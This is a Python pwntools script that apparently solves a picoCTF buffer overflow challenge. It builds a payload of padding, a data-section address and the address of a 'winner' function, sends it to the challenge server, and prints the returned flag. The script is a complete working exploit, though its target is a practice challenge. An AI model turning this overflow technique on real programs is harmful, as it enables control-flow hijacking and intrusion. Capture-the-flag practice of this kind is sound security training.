from pwn import *

host = 'foggy-cliff.picoctf.net'
port = 53002

# binary parsing

elf = ELF('./vuln')
winner = elf.symbols['winner']
valid_dst = elf.symbols['__data_start']

padding = b'a' * 20

print(f'\033[33m[+] Winner address : {hex(winner)}\033[0m')
print(f'\033[34m[+] Valid destination : {hex(valid_dst)}\033[0m')

# payload assembling

payload = padding + p32(valid_dst) + p32(winner) + b' sayhi'

print(f'\033[32m[+] Payload assembled : {payload}\033[0m')
print(f'\033[36m[+] Payload length : {len(payload)}\033[0m')

# launch the trigger

r = remote(host, port)

r.recvuntil(b':') 
r.sendline(payload)

r.recvuntil(b"FLAG:")

# get flag

flag = r.recvline().decode().strip()

print(f'\033[33m[+] Flag : {flag}\033[0m')

r.close()
